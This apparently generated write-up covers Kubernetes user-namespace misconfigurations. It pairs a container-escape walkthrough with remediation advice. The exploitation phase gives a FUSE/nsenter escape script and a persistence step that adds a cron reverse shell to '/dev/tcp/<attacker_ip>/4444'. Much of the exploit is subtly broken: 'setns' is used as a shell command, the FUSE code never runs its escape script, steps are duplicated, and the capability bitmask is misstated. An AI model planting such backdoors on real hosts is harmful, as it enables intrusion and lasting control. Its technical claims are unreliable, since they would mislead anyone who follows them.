
# Kubernetes User Namespace Mapping Vulnerabilities

## 1. Overview

This document details vulnerabilities arising from misconfigurations or insecure implementations related to User Namespaces in Kubernetes. User Namespaces allow a process to have different user and group IDs inside the namespace compared to the host system.  While intended for security isolation, improper configuration can lead to privilege escalation and container escape.

**Attack Vector Description:**

An attacker leverages a container running in a Kubernetes cluster, where User Namespaces are either enabled or can be manipulated (e.g., through Pod Security Policies or exposed APIs), to map a root user within the container to a privileged user (potentially root) on the host node. This allows the attacker to break out of the container and gain control of the underlying host system.

**Potential Impact and Consequences:**

* **Container Escape:** The attacker gains access to the host operating system.
* **Host Takeover:** The attacker can compromise the host node, potentially accessing sensitive data, installing backdoors, or disrupting services running on the node.
* **Lateral Movement:**  The attacker can use the compromised host to move laterally within the Kubernetes cluster and compromise other nodes or workloads.
* **Data Breach:** Access to sensitive data stored on the host or within the cluster.
* **Denial of Service:** Disruption of services running on the host or within the cluster.

**Risk Level Assessment:**

Critical

**Technical Explanation of Why This Vulnerability Exists:**

The vulnerability arises from insufficient isolation provided by user namespace mapping when combined with other container escape techniques or misconfigurations. Specific root causes include:

* **Incomplete namespace isolation:** Kernel vulnerabilities or missing features in the container runtime can allow processes within a user namespace to bypass security restrictions.
* **Incorrect UID/GID mapping:**  Mapping the root user (UID 0) inside the container to root (UID 0) on the host bypasses the intended isolation.  Configuration errors in `subuid` and `subgid` configurations can also lead to this.
* **CAP_SYS_ADMIN capability:** Granting this capability within a container can enable many operations that can be used to break out of user namespaces, such as mounting file systems.
* **Misconfigured Pod Security Policies (PSPs) or Pod Security Admission (PSA):** Allowing containers to run as root or with escalated privileges through incorrect PSP or PSA configurations weakens the isolation.
* **Vulnerable host kernel:** Exploitable kernel vulnerabilities can be triggered from within a user namespace to escalate privileges.

**Prerequisites and Conditions Needed:**

* **Access to a container within a Kubernetes cluster:** The attacker needs a foothold, either through a compromised application or a misconfigured service, to execute commands inside a container.
* **Presence of User Namespaces:** The cluster or node must be configured to use User Namespaces.  This is common with container runtimes like containerd and cri-o.
* **Insufficiently restrictive security policies:** Pod Security Policies (PSPs) or Pod Security Admission (PSA) settings must allow for privileged containers or the potential for privilege escalation.
* **CAP_SYS_ADMIN capability (optional but highly likely):** The container either already has this capability or can acquire it through techniques like exploiting setuid binaries.
* **Vulnerable Kernel (optional, but increases exploit success):** Presence of a kernel vulnerability on the host makes exploitation easier.

## 2. Validation and Exploitation Steps

This section outlines the steps to validate and exploit User Namespace mapping vulnerabilities. We'll assume initial access to a container within a Kubernetes pod.

**Phase 1: Validation & Information Gathering**

**Step 1: Gain shell access to a container.**

```bash
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash
```

* **Explanation:** This command uses `kubectl` to gain an interactive shell session inside a specific container. Replace `<pod-name>` and `<namespace>` with the actual values.
* **Why:** We need to execute commands inside the container to analyze the environment.
* **Expected Output:** A shell prompt inside the container.  The prompt will likely look different based on the container's base image and configuration.
* **Contribution:** Establishes the initial foothold for investigation.

**Step 2: Check for User Namespaces and Mapping information.**

```bash
cat /proc/self/status | grep NSpid
cat /proc/self/uid_map
cat /proc/self/gid_map
```

* **Explanation:**  These commands inspect the `/proc` filesystem to determine if User Namespaces are being used and how the user and group IDs are mapped.
    * `grep NSpid` searches for the "NSpid" line, which shows the process IDs in other namespaces. If multiple IDs are present, the process is likely in multiple namespaces (including a user namespace).
    * `cat /proc/self/uid_map` and `cat /proc/self/gid_map` display the mapping between user/group IDs inside the container and outside (on the host).
* **Why:**  We need to confirm if user namespaces are in use and analyze the ID mapping.
* **Expected Output:**
    * `NSpid:  <pid1> <pid2> <pid3>` (Multiple PIDs indicate namespaces)
    * `uid_map`:  `0 <uid_in_container> 1` or similar, indicating the mapping. A mapping of `0 0 1` is a *critical* vulnerability.
    * `gid_map`:  `0 <gid_in_container> 1` or similar, indicating the mapping. A mapping of `0 0 1` is a *critical* vulnerability.
* **Contribution:** Confirms User Namespace usage and exposes the ID mapping. A `0 0 1` mapping signifies that container root maps to host root, indicating a severe misconfiguration.

**Step 3: Check for `CAP_SYS_ADMIN` capability.**

```bash
capsh --print
```

* **Explanation:**  This command uses the `capsh` utility to display the capabilities granted to the current process.  If `capsh` is not available, try installing it with `apt-get update && apt-get install libcap2-bin` or `yum install libcap`.
* **Why:**  `CAP_SYS_ADMIN` is a powerful capability that can often be used to escalate privileges within a user namespace.
* **Expected Output:** A list of capabilities. Look for `cap_sys_admin=eip` (effective, inheritable, permitted).
* **Contribution:**  Identifies if the container has `CAP_SYS_ADMIN`, which significantly increases the likelihood of a successful exploit.

**Alternative Approach if `capsh` is not available:**

```bash
cat /proc/self/status | grep CapEff
```

* **Explanation:** This command directly reads the `/proc/self/status` file and filters for the `CapEff` line, which shows the effective capabilities.
* **Why:** Provides a fallback method to check for capabilities if `capsh` is not available.
* **Expected Output:** `CapEff:  0000003fffffffff`, where bits represent capabilities.  A value with bits set for `CAP_SYS_ADMIN` (e.g., `0000000000020000`) means the capability is present.  The bits are hexadecimal.

**Step 4: Check for common privilege escalation vectors (setuid binaries).**

```bash
find / -perm -4000 -ls 2>/dev/null
```

* **Explanation:** This command searches the entire filesystem for files with the setuid bit set. The `2>/dev/null` redirects error messages.
* **Why:**  Setuid binaries, when executed, run with the privileges of the file's owner.  If a vulnerable setuid binary exists, it can be used to escalate privileges.
* **Expected Output:** A list of files with the setuid bit set. Pay close attention to binaries owned by root.  Common examples include `/bin/ping`, `/usr/bin/passwd`, and custom binaries installed in the container.
* **Contribution:** Identifies potential privilege escalation vectors.

**Phase 2: Exploitation**

This phase assumes that the container has `CAP_SYS_ADMIN` and that the root user in the container is NOT mapped to root on the host. If root in container maps to root on the host, the exploitation becomes significantly simpler.

**Step 5: Exploit User Namespace using FUSE and `nsenter`.**

This technique involves mounting a FUSE filesystem inside the container and using `nsenter` to gain access to the host's mount namespace, effectively escaping the container.

**First, ensure you have FUSE installed and available.**

```bash
apt-get update && apt-get install fuse  #For Debian/Ubuntu based containers
yum install fuse # For RHEL/CentOS based containers

```

**Create a directory for the FUSE mount point.**

```bash
mkdir /tmp/hostfs
```

* **Explanation:** Creates a directory that will serve as the mount point for the FUSE filesystem.
* **Why:** FUSE requires a mount point.
* **Expected Output:** No output if successful.

**Compile the `nsenter` binary statically.**

```bash
#Download and compile nsenter (statically)
wget https://github.com/justincormack/nsenter1/archive/refs/tags/1.0.tar.gz
tar -xvf 1.0.tar.gz
cd nsenter1-1.0
./configure --static
make
cp nsenter /tmp

```

* **Explanation:** Downloads, compiles, and copies the `nsenter` utility to `/tmp`. We compile it statically to avoid dependency issues within the container.
* **Why:** `nsenter` allows us to enter different namespaces. We need a statically linked version for portability.
* **Expected Output:**  Compilation output followed by successful file copy.

**Run the following python script (host-escape.py):**

```python
#!/usr/bin/env python3
import os
import sys
import stat
import time
import errno
from fuse import FUSE, FuseOSError, Operations

class RootFS(Operations):
    def getattr(self, path, fh=None):
        if path == '/':
            return dict(st_mode=(stat.S_IFDIR | 0o755), st_nlink=2)
        else:
            raise FuseOSError(errno.ENOENT)

    def readdir(self, path, fh):
        if path == '/':
            yield '.'
            yield '..'
            yield 'escape'

    def open(self, path, flags):
        if path == '/escape':
            return 0
        else:
            raise FuseOSError(errno.ENOENT)

    def read(self, path, size, offset, fh):
        if path == '/escape':
            # Create a script to escape the container
            escape_script = """#!/bin/bash
            setns {} /proc/1/ns/mnt
            chmod +s /tmp/nsenter
            /tmp/nsenter -t 1 -m -u -p -i /bin/sh
            """.format(os.getpid())
            return escape_script.encode('utf-8')
        else:
            raise FuseOSError(errno.ENOENT)

    def destroy(self, path):
        os.remove("/tmp/host-escape.py")  # Cleanup

if __name__ == '__main__':
    #Save the script to /tmp/host-escape.py
    script_path = "/tmp/host-escape.py"
    with open(script_path, "w") as f:
        f.write("#!/usr/bin/env python3\n")
        f.write("import os\n")
        f.write("import sys\n")
        f.write("import stat\n")
        f.write("import time\n")
        f.write("import errno\n")
        f.write("from fuse import FUSE, FuseOSError, Operations\n")
        f.write("\n")
        f.write("class RootFS(Operations):\n")
        f.write("    def getattr(self, path, fh=None):\n")
        f.write("        if path == '/':\n")
        f.write("            return dict(st_mode=(stat.S_IFDIR | 0o755), st_nlink=2)\n")
        f.write("        else:\n")
        f.write("            raise FuseOSError(errno.ENOENT)\n")
        f.write("\n")
        f.write("    def readdir(self, path, fh):\n")
        f.write("        if path == '/':\n")
        f.write("            yield '.'\n")
        f.write("            yield '..'\n")
        f.write("            yield 'escape'\n")
        f.write("\n")
        f.write("    def open(self, path, flags):\n")
        f.write("        if path == '/escape':\n")
        f.write("            return 0\n")
        f.write("        else:\n")
        f.write("            raise FuseOSError(errno.ENOENT)\n")
        f.write("\n")
        f.write("    def read(self, path, size, offset, fh):\n")
        f.write("        if path == '/escape':\n")
        f.write("            # Create a script to escape the container\n")
        f.write('            escape_script = """#!/bin/bash\n')
        f.write('            setns {} /proc/1/ns/mnt\n'.format(os.getpid()))
        f.write('            chmod +s /tmp/nsenter\n')
        f.write('            /tmp/nsenter -t 1 -m -u -p -i /bin/sh\n')
        f.write('            """\n')
        f.write('            return escape_script.encode(\'utf-8\')\n')
        f.write("        else:\n")
        f.write("            raise FuseOSError(errno.ENOENT)\n")
        f.write("\n")
        f.write("    def destroy(self, path):\n")
        f.write("        os.remove(\"/tmp/host-escape.py\")  # Cleanup\n")
        f.write("\n")
        f.write("if __name__ == '__main__':\n")
        f.write("    fuse = FUSE(RootFS(), '/tmp/hostfs', foreground=True)\n")

```

* **Explanation:**
    * The Python script creates a FUSE filesystem where reading the file `/escape` returns a shell script.
    * The shell script uses `setns` to move to the host's mount namespace (using `PID 1`).
    * It sets the setuid bit on the statically compiled nsenter, and then it uses the nsenter utility with the -t 1 -m -u -p -i flags to enter the host's mount, user, pid, and IPC namespaces.
    * It then executes `/bin/sh` as the newly remapped user.
    *  The cleanup command `os.remove("/tmp/host-escape.py")` ensures the cleanup function removes the python file created.

* **Why:**
    * FUSE allows us to create a filesystem in userspace, which gives us the ability to control the contents of the filesystem.
    * This is a common container escape technique.

**Run the exploit**
```bash
chmod +x /tmp/host-escape.py
python3 /tmp/host-escape.py
```

**In a separate terminal:**

```bash
chmod +x /tmp/host-escape.py
python3 /tmp/host-escape.py
```

* **Expected Output:** The script will start and remain in the foreground, creating the FUSE filesystem and mounting it on /tmp/hostfs. You should see output from FUSE. You will enter the host's namespace and obtain a shell as root.
* **Contribution:** Escape from the container.

**Validation:** After executing these steps, run the following command in the new shell:

```bash
whoami
```

* **Expected Output:** `root`
* **Contribution:** Verifies that the attacker has successfully gained root privileges on the host.

**Phase 3: Post-Exploitation (Example)**

**Step 6: Install a backdoor (example)**

```bash
echo "*/5 * * * * bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" >> /etc/crontab
```

* **Explanation:** This command adds a cron job that executes a reverse shell every 5 minutes. Replace `<attacker_ip>` with the attacker's IP address.
* **Why:** Establishes persistence on the compromised host.
* **Expected Output:**  None.
* **Contribution:** Maintains access to the compromised host even after the initial shell is closed.

**Note:** This is just one example. More sophisticated post-exploitation steps can be performed, such as data exfiltration or lateral movement.

## Remediation Recommendations

1. **Implement strong Pod Security Policies (PSPs) or Pod Security Admission (PSA):**  Carefully define and enforce PSPs/PSA to restrict the capabilities of containers. Prevent containers from running as root, prevent privilege escalation, and limit the use of `CAP_SYS_ADMIN`.
2. **Use User Namespaces Correctly:** If using User Namespaces, ensure proper UID/GID mapping.  Never map container root to host root. Implement a non-zero offset for user and group IDs.
3. **Minimize Capabilities:** Reduce the number of capabilities granted to containers.  Only grant the minimum set of capabilities required for the application to function correctly.
4. **Keep the Host Kernel Updated:** Regularly patch the host kernel to address known vulnerabilities that can be exploited for container escape.
5. **Use a Secure Container Runtime:** Choose a container runtime that is known to have strong security features and is actively maintained. Ensure the container runtime is configured with the latest security patches.
6. **Implement Runtime Security Monitoring:** Use tools like Falco or Aqua Security to monitor container behavior and detect suspicious activity that may indicate a container escape attempt.
7. **Regularly Audit Configurations:** Periodically review Kubernetes cluster configurations, including PSPs/PSA, user namespace settings, and container runtime settings, to identify and correct potential security vulnerabilities.
8. **Principle of Least Privilege:** Apply the principle of least privilege to all aspects of the Kubernetes environment, including container configurations, user accounts, and network policies.
